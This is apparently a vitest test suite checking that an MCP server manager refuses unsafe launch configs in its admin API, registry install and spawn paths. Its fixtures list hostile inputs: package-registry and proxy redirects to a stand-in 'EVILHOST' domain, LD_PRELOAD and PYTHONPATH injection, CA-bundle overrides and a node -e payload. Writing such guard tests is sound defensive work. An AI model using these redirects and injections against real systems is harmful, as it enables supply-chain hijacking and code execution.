/**
 * TD-039 black-box: the runner guard through the real admin API (create + update), the registry
 * install path, and at spawn time for a config that is ALREADY in the database. Every rejection is
 * a 400 / success:false with a generic reason that never echoes the offending value.
 */
import fs from 'node:fs';
import { describe, it, expect, beforeAll, afterAll, afterEach, vi } from 'vitest';
import { getMcpEntryByName } from '@mcpambassador/core';
import {
  startAgentTestServer,
  stopAgentTestServer,
  agentEndpointOpts,
  type AgentTestServer,
} from '../agent-endpoint/helpers.js';
import { FAKE_MCP_PATH } from '../agent-endpoint/fake-mcp-world.js';
import { RegistryService } from '../../src/services/registry-service.js';
import { SecretStore } from '../../src/services/secret-store.js';

const CANARY = 'EVILHOST-7c1e';
let s: AgentTestServer;
let prevAllowed: string | undefined;
const adm = () => ({ 'X-Admin-Key': s.adminKey });
const raw = (): any => (s.db as any).session.client;
let n = 0;
const nm = (p: string): string => `${p}-${++n}-${Date.now() % 100000}`;

beforeAll(async () => {
  prevAllowed = process.env['MCP_ALLOWED_COMMANDS'];
  // allow every runner so the guard (not the command allowlist) is what is under test
  process.env['MCP_ALLOWED_COMMANDS'] = 'node,npx,uvx,python,python3,pnpm,yarn,bunx,deno,bun';
  s = await startAgentTestServer(agentEndpointOpts());
});
afterAll(async () => {
  await stopAgentTestServer(s);
  if (prevAllowed === undefined) delete process.env['MCP_ALLOWED_COMMANDS'];
  else process.env['MCP_ALLOWED_COMMANDS'] = prevAllowed;
});
afterEach(() => vi.restoreAllMocks());

const bodyOf = (
  command: string[],
  env: Record<string, string> = {},
  extra: Record<string, unknown> = {}
) => ({
  name: nm('rg'),
  display_name: 'rg',
  transport_type: 'stdio',
  config: { command, env },
  ...extra,
});
const post = (payload: unknown) =>
  s.admin.inject({
    method: 'POST',
    url: '/v1/admin/mcps',
    headers: adm(),
    payload: payload as never,
  });

const BAD_COMMANDS: Array<[string, string[]]> = [
  ['npx --registry=URL pkg', ['npx', `--registry=https://${CANARY}`, 'x@1']],
  ['npx --registry URL', ['npx', '--registry', `https://${CANARY}`]],
  ['uvx --from=git+URL', ['uvx', `--from=git+https://${CANARY}/x.git`, 'tool']],
  ['node -p "..."', ['node', '-p', `"${CANARY}"`]],
  // reviewer bypass set (TD-039 rework)
  ['npx --reg=URL (abbreviated)', ['npx', `--reg=https://${CANARY}`, 'x@1']],
  ['npx --git=', ['npx', `--git=https://${CANARY}/git`, 'x@1']],
  [
    'npx --https-proxy= + --strict-ssl=false',
    ['npx', `--https-proxy=https://${CANARY}`, '--strict-ssl=false', 'x@1'],
  ],
  ['npx --cafile=', ['npx', `--cafile=/${CANARY}.pem`, 'x@1']],
  [
    'python3 -m pip install -i URL',
    ['python3', '-m', 'pip', 'install', '-i', `https://${CANARY}/simple`, 'x'],
  ],
  [
    'pip --extra-index=URL (abbrev)',
    ['python3', '-m', 'pip', 'install', `--extra-index=https://${CANARY}/s`, 'x'],
  ],
  [
    'pip --index-u=URL (abbrev)',
    ['python3', '-m', 'pip', 'install', `--index-u=https://${CANARY}/s`, 'x'],
  ],
  [
    'pip --find=URL (abbrev)',
    ['python3', '-m', 'pip', 'install', `--find=https://${CANARY}/s`, 'x'],
  ],
  ['deno run --import-map=URL', ['deno', 'run', `--import-map=https://${CANARY}/m.json`, 'x.ts']],
  ['bun run --preload', ['bun', 'run', '--preload', `/${CANARY}.js`, 'x.ts']],
];
const BAD_ENVS: Array<[string, Record<string, string>]> = [
  ['npm_config_registry', { npm_config_registry: `https://${CANARY}` }],
  ['NPM_CONFIG_REGISTRY', { NPM_CONFIG_REGISTRY: `https://${CANARY}` }],
  ['Pip_Index_Url (mixed case)', { Pip_Index_Url: `https://${CANARY}/simple` }],
  ['PYTHONPATH', { PYTHONPATH: `/${CANARY}` }],
  ['LD_PRELOAD', { LD_PRELOAD: `/${CANARY}.so` }],
  ['HTTPS_PROXY', { HTTPS_PROXY: `https://${CANARY}` }],
  ['https_proxy (lower)', { https_proxy: `https://${CANARY}` }],
  ['Https_Proxy (mixed)', { Https_Proxy: `https://${CANARY}` }],
  ['SSL_CERT_FILE', { SSL_CERT_FILE: `/${CANARY}.pem` }],
  ['REQUESTS_CA_BUNDLE', { REQUESTS_CA_BUNDLE: `/${CANARY}.pem` }],
];

describe('admin API create', () => {
  for (const [label, command] of BAD_COMMANDS) {
    it(`400, nothing stored, value not echoed: ${label}`, async () => {
      const b = bodyOf(command);
      const r = await post(b);
      expect(r.statusCode).toBe(400);
      expect(r.body).not.toContain(CANARY);
      expect(await getMcpEntryByName(s.db, b.name)).toBeNull();
    });
  }
  for (const [label, env] of BAD_ENVS) {
    it(`400, nothing stored, value not echoed: env ${label}`, async () => {
      const b = bodyOf(['node', 'server.mjs'], env);
      const r = await post(b);
      expect(r.statusCode).toBe(400);
      expect(r.body).not.toContain(CANARY);
      expect(await getMcpEntryByName(s.db, b.name)).toBeNull();
    });
  }
  it('400 for a reserved name in credential_schema (key and env_var) and oauth access_token_env_var', async () => {
    for (const extra of [
      {
        requires_user_credentials: true,
        credential_schema: { type: 'object', properties: { PIP_INDEX_URL: { type: 'string' } } },
      },
      {
        requires_user_credentials: true,
        credential_schema: {
          type: 'object',
          properties: { tok: { type: 'string', env_var: 'LD_PRELOAD' } },
        },
      },
    ]) {
      const r = await post(bodyOf(['node', 'server.mjs'], {}, extra));
      expect(r.statusCode, r.body).toBe(400);
    }
  });
  it('clean `npx -y pkg@1.2.3` is accepted (201), as are NODE_ENV and a post-package option', async () => {
    const r1 = await post(bodyOf(['npx', '-y', 'pkg@1.2.3']));
    expect(r1.statusCode, r1.body).toBe(201);
    const r2 = await post(
      bodyOf(['npx', '-y', 'pkg@1.2.3', '--registry', 'x'], { NODE_ENV: 'production' })
    );
    expect(r2.statusCode, r2.body).toBe(201); // options after the package belong to the package
  });
});

describe('docker is refused by default', () => {
  it('with the default allowlist, docker fails validation and discovery (allowlist is enforced at validate/spawn)', async () => {
    const prev = process.env['MCP_ALLOWED_COMMANDS'];
    delete process.env['MCP_ALLOWED_COMMANDS'];
    try {
      const c = await post(bodyOf(['docker', 'run', '--rm', `${CANARY}/img`]));
      expect(c.statusCode, c.body).toBe(201);
      const id = JSON.parse(c.body).data.mcp_id as string;
      const v = await s.admin.inject({
        method: 'POST',
        url: `/v1/admin/mcps/${id}/validate`,
        headers: adm(),
      });
      expect(v.body).not.toContain(CANARY);
      expect(v.body, 'validate must report the command as not allowed').toMatch(
        /not in the allowed command list|invalid|"valid":false|failed/i
      );
      expect(v.body).not.toMatch(/"validation_status":"valid"/);
      const d = await s.admin.inject({
        method: 'POST',
        url: `/v1/admin/mcps/${id}/discover`,
        headers: adm(),
      });
      expect(d.body).not.toContain(CANARY);
      expect(d.body).not.toMatch(/"tool_count":[1-9]/);
    } finally {
      if (prev !== undefined) process.env['MCP_ALLOWED_COMMANDS'] = prev;
    }
  });
});

describe('admin API update', () => {
  it('PATCH to a bad command / env is refused (400) and the stored config is unchanged', async () => {
    const b = bodyOf(['npx', '-y', 'pkg@1.2.3']);
    const c = await post(b);
    expect(c.statusCode, c.body).toBe(201);
    const id = JSON.parse(c.body).data.mcp_id as string;
    const before = raw().prepare('SELECT config FROM mcp_catalog WHERE mcp_id=?').get(id).config;
    const cases: Array<Record<string, unknown>> = [
      ...BAD_COMMANDS.map(([, command]) => ({ config: { command } })),
      ...BAD_ENVS.map(([, env]) => ({ config: { command: ['node', 'x.mjs'], env } })),
    ];
    for (const config of cases) {
      const r = await s.admin.inject({
        method: 'PATCH',
        url: `/v1/admin/mcps/${id}`,
        headers: adm(),
        payload: config as never,
      });
      expect(r.statusCode, JSON.stringify(config)).toBe(400);
      expect(r.body).not.toContain(CANARY);
    }
    expect(raw().prepare('SELECT config FROM mcp_catalog WHERE mcp_id=?').get(id).config).toBe(
      before
    );
  });
});

describe('registry install', () => {
  const doc = (entries: Array<{ name: string; command: string[]; env?: Record<string, string> }>) =>
    JSON.stringify({
      schema_version: '1',
      registry: { name: 't', maintainer: 't', updated_at: '2026-01-01' },
      mcps: entries.map(e => ({
        name: e.name,
        display_name: e.name,
        description: 'd',
        transport_type: 'stdio',
        config: { command: e.command, ...(e.env ? { env: e.env } : {}) },
      })),
    });
  async function svcFor(entries: Parameters<typeof doc>[0]): Promise<RegistryService> {
    vi.spyOn(globalThis, 'fetch').mockResolvedValue(new Response(doc(entries), { status: 200 }));
    const r = new RegistryService(
      { url: 'https://registry.example/r.yaml', refreshIntervalHours: 24, enabled: true },
      s.db,
      new SecretStore({})
    );
    await r.fetchRegistry();
    return r;
  }
  const bad = [
    ...BAD_COMMANDS.map(([l, c]) => ({ l, name: nm('reg'), command: c, env: undefined })),
    ...BAD_ENVS.map(([l, e]) => ({
      l: `env ${l}`,
      name: nm('reg'),
      command: ['node', 'x.mjs'],
      env: e,
    })),
  ];
  it('every bad entry: success:false, nothing stored, value not echoed; the clean one installs', async () => {
    const clean = nm('reg-clean');
    const svc = await svcFor([
      ...bad.map(b => ({ name: b.name, command: b.command, env: b.env })),
      { name: clean, command: ['npx', '-y', 'pkg@1.2.3'] },
    ]);
    for (const b of bad) {
      const r = await svc.installEntry(b.name);
      expect(r.success, b.l).toBe(false);
      expect(JSON.stringify(r), b.l).not.toContain(CANARY);
      expect(await getMcpEntryByName(s.db, b.name), b.l).toBeNull();
    }
    const ok = await svc.installEntry(clean);
    expect(ok.success, JSON.stringify(ok)).toBe(true);
    expect(await getMcpEntryByName(s.db, clean)).not.toBeNull();
  });
});

describe('spawn time: a bad config already in the database', () => {
  // The row is written behind the API (as a pre-upgrade or hand-edited row would be). If the guard
  // failed open, `node -e` would run the payload and create the canary file.
  const canaryFile = `/tmp/rg-canary-${process.pid}`;
  async function plant(config: Record<string, unknown>): Promise<string> {
    // a legitimately validated MCP first (validation_status=valid), then the row is corrupted
    const c = await post(bodyOf(['node', FAKE_MCP_PATH]));
    expect(c.statusCode, c.body).toBe(201);
    const id = JSON.parse(c.body).data.mcp_id as string;
    const v = await s.admin.inject({
      method: 'POST',
      url: `/v1/admin/mcps/${id}/validate`,
      headers: adm(),
    });
    expect(v.statusCode, v.body).toBe(200);
    raw().prepare('UPDATE mcp_catalog SET config=? WHERE mcp_id=?').run(JSON.stringify(config), id);
    return id;
  }
  const payload = `require('fs').writeFileSync('${canaryFile}','x')`;
  const cases: Array<[string, Record<string, unknown>]> = [
    ['node -e', { command: ['node', '-e', payload] }],
    ['node --eval=', { command: ['node', `--eval=${payload}`] }],
    ['node -p', { command: ['node', '-p', payload] }],
    ['npx --registry=', { command: ['npx', `--registry=https://${CANARY}`, 'x@1'] }],
    [
      'env npm_config_registry',
      { command: ['node', 'x.mjs'], env: { npm_config_registry: `https://${CANARY}` } },
    ],
    ['env LD_PRELOAD', { command: ['node', 'x.mjs'], env: { LD_PRELOAD: `/${CANARY}.so` } }],
  ];
  it('control: the same planted-row path with a clean config discovers its tools (spawn works)', async () => {
    const id = await plant({
      command: ['node', FAKE_MCP_PATH],
      env: { FAKE_MCP_TOOLS: 'ctl1,ctl2' },
    });
    const d = await s.admin.inject({
      method: 'POST',
      url: `/v1/admin/mcps/${id}/discover`,
      headers: adm(),
      payload: {},
    });
    const dj = JSON.parse(d.body);
    expect(dj.data?.status, d.body).toBe('success');
    expect(dj.data?.tool_count).toBeGreaterThanOrEqual(2);
  });
  for (const [label, config] of cases) {
    it(`spawn is refused by the guard (payload never runs): ${label}`, async () => {
      try {
        fs.unlinkSync(canaryFile);
      } catch {
        /* absent */
      }
      const id = await plant(config);
      const d = await s.admin.inject({
        method: 'POST',
        url: `/v1/admin/mcps/${id}/discover`,
        headers: adm(),
        payload: {},
      });
      const dj = JSON.parse(d.body);
      expect(d.statusCode === 200 ? dj.data?.status : 'http-error', d.body).not.toBe('success');
      expect(dj.data?.tool_count ?? 0, d.body).toBe(0);
      expect(d.body).not.toContain(CANARY);
      await new Promise(r => setTimeout(r, 500));
      expect(fs.existsSync(canaryFile), 'payload must not have run').toBe(false);
      // re-validation of the stored row also flags it
      const v2 = await s.admin.inject({
        method: 'POST',
        url: `/v1/admin/mcps/${id}/validate`,
        headers: adm(),
      });
      expect(v2.body).not.toContain(CANARY);
      expect(
        JSON.parse(v2.body).data?.valid ?? JSON.parse(v2.body).data?.validation_status
      ).not.toBe(true);
    });
  }
});
